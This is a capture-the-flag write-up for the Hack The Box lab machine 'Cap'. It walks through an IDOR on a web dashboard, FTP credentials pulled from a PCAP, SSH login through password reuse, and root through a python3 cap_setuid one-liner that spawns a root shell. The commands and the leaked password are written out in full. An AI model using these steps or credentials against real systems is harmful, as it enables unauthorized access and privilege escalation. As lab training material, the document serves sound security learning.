# HTB: Cap — Writeup

**Difficulty:** Easy  
**OS:** Linux  
**IP:** 10.10.10.245  
**Core Concepts:** IDOR, Network Traffic Analysis (PCAP), Linux Capabilities

---

## Summary

Exploited an IDOR vulnerability on a web dashboard to download 
a PCAP file containing FTP credentials in plaintext. Used those 
credentials to gain SSH access, then escalated to root by abusing 
a dangerous Linux Capability (cap_setuid) set on Python3.

---

## Attack Chain
```
nmap scan
    ↓
Web dashboard — IDOR on /data/0
    ↓
Download 0.pcap → FTP credentials in plaintext
    ↓
SSH as nathan → user.txt
    ↓
cap_setuid on /usr/bin/python3.8
    ↓
os.setuid(0) → root shell → root.txt
```

---

## 1. Reconnaissance
```bash
nmap -sC -sV 10.10.10.245
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.0.3 |
| 22   | SSH     | OpenSSH 8.2p1 |
| 80   | HTTP    | Python Gunicorn |

Port 80 shows a network monitoring dashboard.
Starting point — web application on port 80.

---

## 2. Web Enumeration

Navigating to `http://10.10.10.245` revealed a dashboard
with network capture statistics.

Noticed URL pattern: `/data/1`

Tested for IDOR by changing the ID:
```
http://10.10.10.245/data/0
```

**Result:** Got access to a different capture — one that 
belonged to another user. Classic IDOR — no authorization 
check on the resource ID.

Downloaded the file: `0.pcap`

---

## 3. PCAP Analysis

Opened `0.pcap` in Wireshark and filtered for FTP traffic:
```
ftp
```

Found credentials transmitted in plaintext:
```
USER nathan
PASS Buck3tH4TF0RM3!
```

FTP sends credentials unencrypted — always capture and 
analyze traffic during pentests.

---

## 4. Foothold

Tried password reuse on SSH:
```bash
ssh nathan@10.10.10.245
# password: Buck3tH4TF0RM3!
```

Success — logged in as `nathan`.
```bash
cat ~/user.txt
```
```
user.txt: 2e4c965f7a7d2814078x4e65x7b35x2  
```

---

## 5. Privilege Escalation

### Enumeration

Checked standard privesc vectors — nothing obvious.
Moved to Linux Capabilities:
```bash
getcap -r / 2>/dev/null
```

**Output:**
```
/usr/bin/python3.8 = cap_setuid+ep
```

### What is cap_setuid?

`cap_setuid` allows a process to change its UID to any value,
including 0 (root). Combined with `ep` (effective + permitted),
this means Python can set its own UID to root without sudo.

This is more dangerous than SUID in some cases because it's
less visible and often overlooked during hardening.

### Exploitation
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Got root shell immediately.
```bash
cat /root/root.txt
```
```
root.txt: 2f7b3e4c965f7a7d28140x4e65x7b35  
```

---

## Key Takeaways

**IDOR:**
- Always test sequential IDs in URLs — change /data/1 to /data/0
- Server must validate that the requested resource belongs 
  to the authenticated user, not just that the user is authenticated

**Plaintext Credentials:**
- FTP transmits credentials in plaintext
- Always analyze PCAP files for credentials
- Use `ftp` filter in Wireshark, look for USER and PASS commands

**Linux Capabilities:**
- More subtle than SUID — often missed in security audits
- `cap_setuid` on any interpreter (python, perl, ruby) = instant root
- Always run `getcap -r / 2>/dev/null` during privesc enumeration
- Never assign capabilities to interpreters in production

---

## Tools Used

- `nmap` — port scanning
- `Wireshark` — PCAP analysis  
- `getcap` — Linux capabilities enumeration
- `python3` — privilege escalation

---

## References

- [IDOR OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [Linux Capabilities — man7.org](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [GTFOBins — Python](https://gtfobins.github.io/gtfobins/python/)
